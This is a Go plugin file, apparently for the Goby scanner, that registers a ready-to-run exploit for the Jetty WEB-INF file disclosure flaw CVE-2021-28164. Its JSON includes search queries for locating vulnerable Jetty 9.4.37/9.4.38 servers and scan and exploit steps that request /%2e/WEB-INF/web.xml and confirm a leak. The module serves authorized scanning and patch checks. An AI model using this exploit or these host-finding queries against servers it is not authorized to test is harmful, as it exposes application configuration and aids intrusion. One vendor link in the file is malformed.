package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jetty File Read (CVE-2021-28164)",
    "Description": "In Eclipse Jetty 9.4.37.v20210219 to 9.4.38.v20210224, the default compliance mode allows requests with URIs that contain %2e or %2e%2e segments to access protected resources within the WEB-INF directory. For example a request to /context/%2e/WEB-INF/web.xml can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.",
    "Impact": "Jetty File Read (CVE-2021-28164)",
    "Recommendation": "<p>The vendor has released a bug fix, please stay tuned for updates: <a href=\"https://www.eclipse.org/jetty/download.php\">https:/ /www.eclipse.org/jetty/download.php</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
    "Product": "Jetty",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Jetty WEB-INF 敏感信息泄露漏洞",
            "Description": "<p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p><p>Jetty9.4.37/9.4.38版本存在WEB-INF 敏感信息泄露漏洞，攻击者可下载WEB-INF目录下的任意文件。</p>",
            "Impact": "<p>Jetty9.4.37/9.4.38版本存在WEB-INF 敏感信息泄露漏洞，攻击者可下载WEB-INF目录下的任意文件。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.eclipse.org/jetty/download.php\" rel=\"nofollow\">https://www.eclipse.org/jetty/download.php</a></p><br><br><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "Jetty",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Jetty File Read (CVE-2021-28164)",
            "Description": "In Eclipse Jetty 9.4.37.v20210219 to 9.4.38.v20210224, the default compliance mode allows requests with URIs that contain %2e or %2e%2e segments to access protected resources within the WEB-INF directory. For example a request to /context/%2e/WEB-INF/web.xml can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.",
            "Impact": "Jetty File Read (CVE-2021-28164)",
            "Recommendation": "<p>The vendor has released a bug fix, please stay tuned for updates: <a href=\"https://www.eclipse.org/jetty/download.php\" rel=\"nofollow\">https:/ /www.eclipse.org/jetty/download.php</a></p><br><br><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
            "Product": "Jetty",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "server=\"Jetty(9.4.37)\" || server=\"Jetty(9.4.38)\"",
    "GobyQuery": "server=\"Jetty(9.4.37)\" || server=\"Jetty(9.4.38)\"",
    "Author": "yanwu",
    "Homepage": "https://www.eclipse.org/jetty/",
    "DisclosureDate": "2021-06-11",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28164"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.6",
    "CVEIDs": [
        "CVE-2021-28164"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202104-036"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/%2e/WEB-INF/web.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<web-app>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<display-name>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Archetype Created Web Application",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/%2e/WEB-INF/web.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<web-app>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<display-name>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Archetype Created Web Application",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "/WEB-INF/web.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10211"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
